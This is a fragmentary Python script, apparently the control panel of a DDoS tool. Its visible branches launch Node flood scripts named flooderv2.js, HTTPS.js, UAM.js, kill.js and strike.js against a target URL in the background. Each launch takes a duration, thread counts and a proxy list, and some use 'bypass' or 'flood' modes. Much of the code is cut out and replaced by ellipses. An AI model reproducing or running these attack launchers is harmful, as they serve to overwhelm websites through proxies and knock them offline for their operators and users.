...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node Lintarv6.js {url} {duration} 100 5 proxy.txt')
                    os.system(f'screen -dm node lol.js {url} proxy.txt {duration}')
                    os.system(f'screen -dm node UAM.js {url} {duration} 64 5 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node flooderv2.js {url} {duration} 5 proxy.txt 100 bypass')
                    os.system(f'screen -dm node flooderv2.js {url} {duration} 5 proxy.txt 100 flood')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node HTTPS.js GET {url} {duration} 5 64 proxy.txt')
                    os.system(f'screen -dm node HTTPS.js POST {url} {duration} 5 64 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node MixBill.js {url} {duration} 100 5')
                    os.system(f'screen -dm node kill.js {url} {duration} 5')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node strike.js GET {url} {duration} 5 64 proxy.txt')
                    os.system(f'screen -dm node strike.js POST {url} {duration} 5 64 proxy.txt')
